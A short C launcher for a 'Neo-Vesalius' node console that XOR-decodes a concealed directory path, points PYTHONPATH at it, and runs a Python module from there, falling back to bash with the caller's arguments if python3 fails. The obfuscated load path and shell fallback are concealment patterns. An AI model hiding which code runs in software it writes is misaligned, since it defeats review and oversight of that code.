/* Neo-Vesalius node console launcher. */
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static const unsigned char enc[] = {0x75, 0x2f, 0x29, 0x28, 0x75, 0x36, 0x35, 0x39, 0x3b, 0x36, 0x75, 0x36, 0x33, 0x38, 0x75, 0x39, 0x35, 0x28, 0x2e, 0x3f, 0x22, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e};

int main(int argc, char **argv) {
    char path[sizeof(enc) + 1];
    size_t i;
    for (i = 0; i < sizeof(enc); i++) path[i] = (char)(enc[i] ^ 0x5a);
    path[sizeof(enc)] = 0;
    setenv("PYTHONPATH", path, 1);
    char **args = calloc((size_t)argc + 3, sizeof(char *));
    if (!args) return 127;
    args[0] = "/usr/bin/python3";
    args[1] = "-c";
    args[2] = "import sys,os;sys.path.insert(0,os.environ.get('PYTHONPATH',''));import console_core;sys.exit(console_core.main())";
    for (i = 1; i < (size_t)argc; i++) args[i + 2] = argv[i];
    args[(size_t)argc + 2] = NULL;
    execv("/usr/bin/python3", args);
    execv("/bin/bash", argv);
    return 127;
}
